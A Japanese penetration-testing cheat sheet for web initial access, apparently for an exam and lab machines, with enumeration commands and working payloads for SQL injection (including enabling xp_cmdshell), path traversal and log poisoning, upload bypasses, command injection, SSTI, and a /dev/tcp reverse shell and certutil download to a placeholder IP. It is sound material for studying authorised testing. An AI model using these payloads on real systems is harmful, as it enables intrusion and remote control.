# Web イニシャルアクセス チートシート

> 原則: **「このアプリは何者で、入力はどこへ渡るか」を先に理解し、攻撃は後。**
> 想定解はシンプル。難しく感じたら列挙に戻る。

---

## 0. 頭の中で常に回す 4 つの問い

1. **これは何か？** — 製品名・バージョン・言語・フレームワーク
2. **何ができるか？** — 機能の一覧（ログイン、検索、アップロード、管理画面…）
3. **入力はどこへ行くか？** — SQL / OS コマンド / ファイルパス / テンプレート / 外部 HTTP
4. **まだ見ていない所はどこか？** — 別ポート、vhost、未探索ディレクトリ、認証後の画面

---

## 1. 最初の 5 分（Burp は常に通す）

```bash
whatweb -a 3 http://$IP
curl -skI http://$IP                     # Server / X-Powered-By / Set-Cookie
curl -sk http://$IP/robots.txt ; curl -sk http://$IP/sitemap.xml
```

| 見る場所 | 読み取ること |
|---|---|
| レスポンスヘッダ・Cookie 名 | `PHPSESSID`=PHP、`JSESSIONID`=Java、`ASP.NET_SessionId`=.NET、`connect.sid`=Node |
| ソース・コメント・JS | バージョン、隠しパス、API エンドポイント、ユーザー名、ホスト名 |
| フッタ・`/README` `/CHANGELOG` `/LICENSE` | 製品名とバージョン |
| 404・エラーページ | Web サーバ・フレームワークの種類 |
| TLS 証明書・リダイレクト先 | ホスト名 → `/etc/hosts` に追加 |
| favicon・デフォルトページ | 製品の特定 |

**IP で開いて何もなければ、ホスト名で開き直す。**

---

## 2. バックグラウンドで回す探索（手動巡回と並行）

```bash
# ディレクトリ・ファイル（拡張子はスタックに合わせる）
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak,zip,html
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak

# vhost
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <通常サイズ>

# パラメータ
ffuf -u "http://$IP/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <通常サイズ>
```

- 何も出なければ **ワードリストを変える**（common → raft-medium → directory-list-2.3-medium）
- 見つけたディレクトリの**下も再探索**。403 でも中のファイルは読めることがある
- 拡張子: PHP=`php,phtml` / IIS=`asp,aspx,config` / Java=`jsp,do,action` / 共通=`txt,bak,old,zip,sql`
- `.git` があれば `git-dumper` でソース取得

---

## 3. 判断の分岐（優先度順に上から潰す）

| # | 状況 | やること |
|---|---|---|
| 1 | **製品名＋バージョンが分かった** | `searchsploit <名前> <ver>` と Google `<名前> <ver> exploit`。**最頻出。まずここ** |
| 2 | **ログイン画面がある** | `admin:admin` `admin:password`、製品のデフォルト認証情報、マシン名・サービス名、他で拾った認証情報の使い回し |
| 3 | **管理画面に入れた** | コード実行できる機能を探す: テーマ/テンプレート編集、プラグイン/モジュールのアップロード、ファイルマネージャ、バックアップ復元、コマンド実行系の設定 |
| 4 | **アップロードがある** | シェルを上げる → 保存先を特定 → アクセスして実行 |
| 5 | **`?page=` `?file=` `?lang=` など** | LFI / パストラバーサル |
| 6 | **ID・検索・ログインのパラメータ** | SQLi |
| 7 | **裏でコマンドを呼びそうな機能**（ping、変換、診断） | コマンドインジェクション |
| 8 | **入力がそのまま画面に出る** | SSTI |
| 9 | **URL を受け取るパラメータ** | SSRF / RFI（自分の HTTP サーバに来るか確認） |
| 10 | **何もない** | §6 へ |

---

## 4. 入力点ごとの確認（Repeater で 1 つずつ変えて差分を見る）

見る差分: **ステータスコード / レスポンス長 / エラーメッセージ / 応答時間**

### SQLi（sqlmap は試験で禁止 → 手動）
```
'            "            ' OR 1=1-- -            ' AND SLEEP(5)-- -
' ORDER BY 1-- -   （列数が合うまで増やす）
' UNION SELECT NULL,NULL,NULL-- -
```
- MySQL: `@@version`, `information_schema.tables`, `LOAD_FILE()`, `INTO OUTFILE '/var/www/html/s.php'`
- MSSQL: `'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -` → `EXEC xp_cmdshell 'whoami'`
- PostgreSQL: `COPY (SELECT '') TO PROGRAM 'id'`
- ログインバイパス: `admin'-- -` / `' OR '1'='1`

### LFI / パストラバーサル
```
../../../../etc/passwd          ....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd     php://filter/convert.base64-encode/resource=index
C:\Windows\System32\drivers\etc\hosts
```
- 読む物: アプリの設定ファイル（DB 認証情報）、`/home/<user>/.ssh/id_rsa`、`/etc/passwd` でユーザー確認
- RCE 化: ログポイズニング（`/var/log/apache2/access.log` に User-Agent で PHP を混入）、`data://`、`php://input`、アップロード済みファイルの include
- Windows: `C:\inetpub\wwwroot\web.config`、`C:\xampp\apache\logs\access.log`

### ファイルアップロード
- 拡張子: `.php` → `.phtml` `.php5` `.phar` `.pHp` / `.aspx` → `.ashx` `.asmx` `.config`
- 二重拡張子 `shell.php.jpg`、Content-Type を `image/png` に、先頭に `GIF89a;`
- `.htaccess` を上げて任意拡張子を PHP として実行
- 保存先が不明ならディレクトリ探索（`/uploads` `/files` `/images` `/media`）
- 実行できなくても、SMB/FTP の書き込み先が Web ルートなら同じ発想

### コマンドインジェクション
```
; id      | id      || id      && id      `id`      $(id)      %0aid
```
- 出力が見えない → `; sleep 5`、`; ping -c 1 <自分>`（`tcpdump -i tun0 icmp`）、`; curl http://<自分>/x`

### SSTI
```
{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   {{7*'7'}}
```
49 が返れば該当。エンジンを特定してから RCE ペイロードを検索。

---

## 5. コード実行 → シェル

1. **まず実行できているか確認**: `id` / `whoami`、または自分宛ての `ping` / `curl`
2. 待受: `rlwrap nc -lvnp 443`（**80 / 443 / 対象で開いているポート**を使う）
3. ペイロード: revshells.com の形式を OS・言語に合わせる
   - Linux: `bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'`（URL エンコード）
   - Windows: PowerShell の Base64 ワンライナー、または `certutil -urlcache -f http://<IP>/nc.exe C:\Windows\Temp\nc.exe`
4. 返らない時の切り分け: ポートを変える → 別ペイロード → ファイルを落として実行 → 特殊文字のエンコード確認
5. 安定化: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg`

---

## 6. 詰まった時のチェックリスト

- [ ] 全ポートを見たか（別ポートの Web、高番ポート）
- [ ] ホスト名でアクセスしたか / vhost 探索をしたか
- [ ] ワードリストと拡張子を変えて再探索したか
- [ ] 見つけたディレクトリの下を再帰的に探索したか
- [ ] ソース・JS・コメントを全ページ読んだか
- [ ] 製品のバージョンを特定して検索したか（別の PoC も試したか）
- [ ] デフォルト認証情報と使い回しを試したか
- [ ] ユーザー登録して**認証後の機能**を見たか
- [ ] 他サービス（FTP / SMB / SNMP / NFS）に Web の認証情報やソースが落ちていないか
- [ ] Burp の HTTP history で見落としたリクエスト・パラメータはないか
- [ ] HTTP メソッドを変えたか（`OPTIONS`、`PUT`、GET↔POST）

**30〜45 分進展がなければ攻め筋を変える。1.5〜2 時間で別マシンへ。**

---

## 7. メモの型（マシンごとに埋める）

```
[スタック]    Web サーバ / 言語 / フレームワーク / CMS＋バージョン
[ホスト名]    
[パス]        発見したディレクトリ・ファイル
[入力点]      URL / パラメータ / 推測される行き先 / 試した結果
[認証情報]    拾った場所 / 試した先
[既知脆弱性]  CVE・EDB-ID / 試した PoC / 結果
[未確認]      次に試すこと
```
